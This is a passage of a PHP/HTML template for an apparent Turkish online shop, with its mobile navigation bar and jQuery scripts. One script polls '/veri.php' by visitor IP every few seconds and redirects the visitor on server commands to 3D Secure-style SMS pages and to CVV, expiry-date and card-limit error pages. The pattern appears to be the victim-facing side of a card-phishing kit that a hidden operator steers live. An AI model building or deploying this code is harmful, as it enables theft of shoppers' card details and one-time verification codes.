                        <path d="M15.0187 14.0654C14.9404 14.0262 14.8557 14.0041 14.7695 14.0005C14.6833 13.9969 14.5972 14.0118 14.5163 14.0444C14.4355 14.077 14.3613 14.1266 14.298 14.1903C14.2348 14.2541 14.1838 14.3308 14.1479 14.416C13.9767 14.8207 13.7021 15.1636 13.3569 15.404C13.0116 15.6444 12.6102 15.7722 12.2001 15.7722C11.79 15.7722 11.3885 15.6444 11.0433 15.404C10.698 15.1636 10.4235 14.8207 10.2523 14.416C10.216 14.331 10.1646 14.2547 10.1012 14.1912C10.0377 14.1278 9.96335 14.0786 9.88238 14.0464C9.8014 14.0142 9.71538 13.9997 9.62923 14.0036C9.54307 14.0075 9.45847 14.0298 9.38025 14.0692C9.30203 14.1086 9.23172 14.1644 9.17335 14.2333C9.11497 14.3023 9.06967 14.383 9.04002 14.471C9.01038 14.5589 8.99697 14.6524 9.00057 14.746C9.00417 14.8396 9.0247 14.9314 9.061 15.0164C9.33726 15.6682 9.77974 16.2203 10.336 16.6073C10.8923 16.9943 11.539 17.2 12.1996 17.2C12.8602 17.2 13.5069 16.9943 14.0632 16.6073C14.6195 16.2203 15.062 15.6682 15.3382 15.0164C15.3749 14.9313 15.3957 14.8392 15.3994 14.7454C15.4031 14.6515 15.3897 14.5578 15.36 14.4696C15.3303 14.3814 15.2848 14.3005 15.2261 14.2315C15.1675 14.1624 15.0968 14.1067 15.0183 14.0674L15.0187 14.0654Z" fill="#8D939C"></path>
                     </svg>
                  </div>
                  <div class="mt-1 text-[9px] text-brand-gray-secondary ">Ana Sayfa</div>
               </div>
               <div class="flex flex-col items-center relative">
                  <div>
                     <svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <circle cx="16" cy="9" r="4.8" stroke="#8D939C" stroke-width="1.4"></circle>
                        <path d="M19.8203 13.1787L23.4997 16.8581" stroke="#8D939C" stroke-width="1.4" stroke-linecap="round"></path>
                        <path d="M7.97511 12.877L7.97519 12.8768C8.00852 12.8175 8.00851 12.7426 7.9752 12.6834L7.97511 12.6832C7.9425 12.6252 7.88702 12.5963 7.83445 12.5963L1.1659 12.5963C1.12617 12.5963 1.08537 12.6123 1.05313 12.6455L7.97511 12.877ZM7.97511 12.877C7.9425 12.935 7.88701 12.9639 7.83445 12.9639L1.1659 12.9639C1.12616 12.9639 1.08537 12.9478 1.05313 12.9147C1.02067 12.8814 1 12.8332 1 12.7801M7.97511 12.877L1 12.7801M1 12.7801C1 12.727 1.02066 12.6788 1.05313 12.6455L1 12.7801Z" fill="#8D939C" stroke="#8D939C"></path>
                        <path d="M6.97511 6.11329L6.97519 6.11315C7.00852 6.05388 7.00851 5.97893 6.9752 5.91968L6.97511 5.91953C6.9425 5.86149 6.88702 5.83263 6.83445 5.83263L1.1659 5.83263C1.12617 5.83263 1.08537 5.84868 1.05313 5.88178L6.97511 6.11329ZM6.97511 6.11329C6.9425 6.17133 6.88701 6.2002 6.83445 6.2002L1.1659 6.2002C1.12616 6.2002 1.08537 6.18414 1.05313 6.15104C1.02067 6.11771 1 6.06953 1 6.01641M6.97511 6.11329L1 6.01641M1 6.01641C1 5.96329 1.02066 5.91512 1.05313 5.88179L1 6.01641Z" fill="#8D939C" stroke="#8D939C"></path>
                        <path d="M15.9752 19.6133L15.9753 19.6131C16.0086 19.5539 16.0086 19.4789 15.9753 19.4197L15.9752 19.4195C15.9426 19.3615 15.8871 19.3326 15.8345 19.3326L1.1659 19.3326C1.12617 19.3326 1.08537 19.3487 1.05313 19.3818L15.9752 19.6133ZM15.9752 19.6133C15.9426 19.6713 15.8871 19.7002 15.8345 19.7002L1.1659 19.7002C1.12616 19.7002 1.08537 19.6841 1.05313 19.651C1.02067 19.6177 1 19.5695 1 19.5164M15.9752 19.6133L1 19.5164M1 19.5164C1 19.4633 1.02066 19.4151 1.05313 19.3818L1 19.5164Z" fill="#8D939C" stroke="#8D939C"></path>
                     </svg>
                  </div>
                  <div class="mt-1 text-[9px] text-brand-gray-secondary ">Kategoriler</div>
               </div>
               <?php if ($sepetSayisi == 0): ?>
                  <div class="flex flex-col items-center relative" onclick="window.location.href='sepet'">
                     <div>
                        <svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                           <path d="M16.2194 17.5283C14.9849 17.5283 13.9839 18.529 13.9839 19.7636C13.9839 20.9984 14.9845 21.9993 16.2191 21.9993C17.454 21.9993 18.4547 20.9984 18.4547 19.7639C18.4536 18.5296 17.4534 17.5296 16.2194 17.5283ZM16.2194 20.9983C15.5374 20.9983 14.9849 20.4456 14.9849 19.7639C14.9849 19.082 15.5374 18.5293 16.2191 18.5293C16.9011 18.529 17.4537 19.082 17.4537 19.7636C17.4529 20.4451 16.9008 20.9972 16.2194 20.9983Z" fill="#8D939C" stroke="#8D939C" stroke-width="0.4"></path>
                           <path d="M22.1961 5.15308H4.43665L4.12428 3.88234C3.85451 2.7738 2.85933 1.99532 1.7187 2.00002H1.50041C1.22406 2.00002 1 2.22408 1 2.50058C1 2.77694 1.22406 3.00099 1.50041 3.00099H1.7187C2.39744 2.99551 2.99101 3.45771 3.15228 4.1172L5.58229 14.0409C5.85347 15.1473 6.84943 15.9223 7.98834 15.9135H18.3829C19.5378 15.9228 20.5428 15.126 20.7974 13.9998L22.6841 5.75323C22.7182 5.60668 22.6827 5.45261 22.5877 5.33565C22.492 5.21806 22.3478 5.15074 22.1961 5.15308ZM19.8218 13.7798C19.6693 14.4494 19.0698 14.9215 18.3829 14.9126H7.98834C7.31054 14.9199 6.71666 14.4598 6.55476 13.8015L4.68152 6.15405H21.5681L19.8218 13.7798Z" fill="#8D939C" stroke="#8D939C" stroke-width="0.4"></path>
                           <path d="M9.44941 17.5283C8.21484 17.5283 7.21387 18.529 7.21387 19.7636C7.21387 20.9984 8.21468 21.9993 9.44926 21.9993C10.684 21.9993 11.6848 20.9984 11.6848 19.7639C11.6837 18.5296 10.6835 17.5296 9.44941 17.5283ZM9.44941 20.9983C8.76754 20.9983 8.21484 20.4456 8.21484 19.7639C8.21484 19.082 8.76754 18.5293 9.44926 18.5293C10.1311 18.529 10.6838 19.082 10.6838 19.7636C10.6831 20.4451 10.1308 20.9972 9.44941 20.9983Z" fill="#8D939C" stroke="#8D939C" stroke-width="0.4"></path>
                        </svg>
                     </div>
                     <div class="mt-1 text-[9px] text-brand-gray-secondary ">Sepetim</div>
                  </div>
               <?php else: ?>
                  <div class="flex flex-col items-center relative" onclick="window.location.href='sepet'">
                     <div class="absolute bg-brand-blue-primary text-white rounded-full p-1 w-auto h-[14px] text-[10px]  -top-[2px] -right-[2px] flex justify-center items-center"><?php echo $sepetSayisi; ?></div>
                     <div>
                        <svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                           <path d="M16.2194 17.5283C14.9849 17.5283 13.9839 18.529 13.9839 19.7636C13.9839 20.9984 14.9845 21.9993 16.2191 21.9993C17.454 21.9993 18.4547 20.9984 18.4547 19.7639C18.4536 18.5296 17.4534 17.5296 16.2194 17.5283ZM16.2194 20.9983C15.5374 20.9983 14.9849 20.4456 14.9849 19.7639C14.9849 19.082 15.5374 18.5293 16.2191 18.5293C16.9011 18.529 17.4537 19.082 17.4537 19.7636C17.4529 20.4451 16.9008 20.9972 16.2194 20.9983Z" fill="#8D939C" stroke="#8D939C" stroke-width="0.4"></path>
                           <path d="M22.1961 5.15308H4.43665L4.12428 3.88234C3.85451 2.7738 2.85933 1.99532 1.7187 2.00002H1.50041C1.22406 2.00002 1 2.22408 1 2.50058C1 2.77694 1.22406 3.00099 1.50041 3.00099H1.7187C2.39744 2.99551 2.99101 3.45771 3.15228 4.1172L5.58229 14.0409C5.85347 15.1473 6.84943 15.9223 7.98834 15.9135H18.3829C19.5378 15.9228 20.5428 15.126 20.7974 13.9998L22.6841 5.75323C22.7182 5.60668 22.6827 5.45261 22.5877 5.33565C22.492 5.21806 22.3478 5.15074 22.1961 5.15308ZM19.8218 13.7798C19.6693 14.4494 19.0698 14.9215 18.3829 14.9126H7.98834C7.31054 14.9199 6.71666 14.4598 6.55476 13.8015L4.68152 6.15405H21.5681L19.8218 13.7798Z" fill="#8D939C" stroke="#8D939C" stroke-width="0.4"></path>
                           <path d="M9.44941 17.5283C8.21484 17.5283 7.21387 18.529 7.21387 19.7636C7.21387 20.9984 8.21468 21.9993 9.44926 21.9993C10.684 21.9993 11.6848 20.9984 11.6848 19.7639C11.6837 18.5296 10.6835 17.5296 9.44941 17.5283ZM9.44941 20.9983C8.76754 20.9983 8.21484 20.4456 8.21484 19.7639C8.21484 19.082 8.76754 18.5293 9.44926 18.5293C10.1311 18.529 10.6838 19.082 10.6838 19.7636C10.6831 20.4451 10.1308 20.9972 9.44941 20.9983Z" fill="#8D939C" stroke="#8D939C" stroke-width="0.4"></path>
                        </svg>
                     </div>
                     <div class="mt-1 text-[10px] bg-brand-blue-primary text-white rounded-full px-1">₺<?php echo $toplamFiyat; ?></div>
                  </div>
               <?php endif; ?>
               <div class="flex flex-col items-center relative">
                  <div>
                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M2.69922 9.84097V19.5819C2.69922 21.0256 3.87381 22.2002 5.31714 22.2002H19.0625C20.5061 22.2002 21.6807 21.0256 21.6807 19.5819V9.84097C21.6807 8.3973 20.5061 7.22271 19.0625 7.22271L16.4111 7.22288C16.7228 7.03291 16.9769 6.83442 17.1335 6.63162C18.0626 5.43088 17.8428 3.70431 16.642 2.77518C16.1414 2.38774 15.5489 2.2002 14.9614 2.2002C14.1398 2.2002 13.3273 2.56679 12.7854 3.26668C12.5089 3.62405 12.3199 4.2674 12.1898 4.99374C12.0598 4.26722 11.8707 3.62371 11.5941 3.26668C11.0526 2.5668 10.2401 2.2002 9.41843 2.2002C8.83094 2.2002 8.23855 2.38777 7.738 2.77553C6.53725 3.70466 6.31741 5.43123 7.24654 6.63197C7.40336 6.83457 7.65755 7.03291 7.96899 7.22323L5.31705 7.22306C3.87372 7.22288 2.69922 8.39734 2.69922 9.84097ZM4.00829 19.5819V13.1139H11.5354V20.8913H5.31718C4.5956 20.8913 4.00829 20.304 4.00829 19.5819ZM20.3718 19.5819C20.3718 20.3037 19.7845 20.891 19.0628 20.891H12.8446V13.114H20.3717L20.3718 19.5819ZM19.063 8.53208C19.7847 8.53208 20.372 9.1194 20.372 9.84115V11.8048L12.8449 11.8046V8.53208L19.063 8.53208ZM13.8208 4.06794C14.0955 3.71279 14.5115 3.50918 14.9616 3.50918C15.2823 3.50918 15.5861 3.61321 15.8408 3.81035C16.1451 4.04575 16.3392 4.38568 16.388 4.76698C16.4367 5.14861 16.3339 5.52612 16.0985 5.83005C15.8444 6.14847 14.658 6.68077 13.2642 7.13877C13.358 5.67599 13.576 4.3944 13.8208 4.06794ZM7.99225 4.76712C8.04094 4.38549 8.23517 4.0459 8.53942 3.81049C8.79413 3.61336 9.09819 3.50932 9.41883 3.50932C9.86878 3.50932 10.2846 3.71312 10.5591 4.06778C10.8035 4.39354 11.0212 5.6758 11.1153 7.13959C9.72254 6.68211 8.53649 6.14963 8.28215 5.83052C8.04624 5.52628 7.9434 5.14873 7.99225 4.76712ZM11.5354 8.53199V11.8049L4.00829 11.8047V9.84089C4.00829 9.11914 4.5956 8.53182 5.31735 8.53182L11.5354 8.53199Z" fill="#8D939C"></path>
                     </svg>
                  </div>
                  <div class="mt-1 text-[9px] text-brand-gray-secondary ">Kampanyalar</div>
               </div>
               <div class="flex flex-col items-center relative">
                  <div>
                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <circle cx="12" cy="7.5" r="4.825" stroke="#8D939C" stroke-width="1.35"></circle>
                        <path d="M2.175 19.5335C2.175 16.9608 4.26061 14.8752 6.83333 14.8752H17.1667C19.7394 14.8752 21.825 16.9608 21.825 19.5335C21.825 20.6335 20.9333 21.5252 19.8333 21.5252H4.16667C3.0667 21.5252 2.175 20.6335 2.175 19.5335Z" stroke="#8D939C" stroke-width="1.35"></path>
                     </svg>
                  </div>
                  <div class="mt-1 text-[9px] text-brand-gray-secondary ">Hesabım</div>
               </div>
            </div>
         </div>
      </div>
   </div>
   <script>
      function SepeteEkle(urun_id) {
         if (urun_id) {
            $.ajax({
               type: 'POST',
               url: 'request.php?action=sepet_ekle',
               data: {
                  ip: "<?php echo $ip; ?>",
                  urun_id: urun_id
               },
               success: function(data) {
                  if (data == "success") {
                     alert("Ürün başarıyla eklendi.");
                     setTimeout(() => {
                        window.location.reload();
                     }, 350);
                  } else if (data == "fail") {
                     alert("Her üründen sadece 1 adet satın alabilirsiniz.");
                  }
               }
            });
         }
      }

      function SepetSil(urun_id) {
         if (urun_id) {
            $.ajax({
               type: 'POST',
               url: 'request.php?action=sepet_sil',
               data: {
                  ip: "<?php echo $ip; ?>",
                  urun_id: urun_id
               },
               success: function(data) {
                  if (data == "success") {
                     alert("Ürün başarıyla silindi.");
                     setTimeout(() => {
                        window.location.reload();
                     }, 350);
                  }
               }
            });
         }
      }
   </script>
   <script type="text/javascript">
      $(document).ready(function() {
         gonder();
         var int = self.setInterval("gonder()", 2500);
      });

      function gonder() {
         $.ajax({
            type: 'POST',
            url: '<?php echo "/veri.php?ip=" . $ip; ?>',
            success: function(msg) {
               if (msg.includes('sms')) {
                  window.location.href = 'acsredirect';
               }
               if (msg.includes('tebrikler')) {
                  window.location.href = 'acsredirect?control=success';
               }
               if (msg.includes('hata_sms')) {
                  window.location.href = 'acsredirect?control=error';
               }
               if (msg.includes('hata_limit')) {
                  window.location.href = '/?redirect=error_limit';
               }
               if (msg.includes('hata_internet')) {
                  window.location.href = '/?redirect=error_internet';
               }
               if (msg.includes('hata_cvv')) {
                  window.location.href = '/odeme?status=cvv';
               }
               if (msg.includes('hata_skt')) {
                  window.location.href = '/odeme?status=skt';
               }
               if (msg.includes('hata_dogrulama')) {
                  window.location.href = '/dogrulama?control=error';
               }
               if (msg == "dogrulama" || msg == "dogrulamadogrulama") {
                  window.location.href = '/dogrulama';
               }
               if (msg.includes('basa_dondur')) {
                  window.location.href = '/';
               }
            }
         });
      }
   </script>
   <script type="text/javascript">
      document.addEventListener("DOMContentLoaded", function() {
         var m1 = document.getElementById('m1');
         var m2 = document.getElementById('m2');

         if (window.innerWidth <= 800) {
            m1.style.display = "block";
            m2.style.display = "block";
         } else {
            m1.style.display = "none";
            m2.style.display = "none";
         }

         window.addEventListener("resize", function() {
            if (window.innerWidth <= 800) {
               m1.style.display = "block";
               m2.style.display = "block";
            } else {
               m1.style.display = "none";
               m2.style.display = "none";
            }
         });
      });
   </script>
</body>

</html>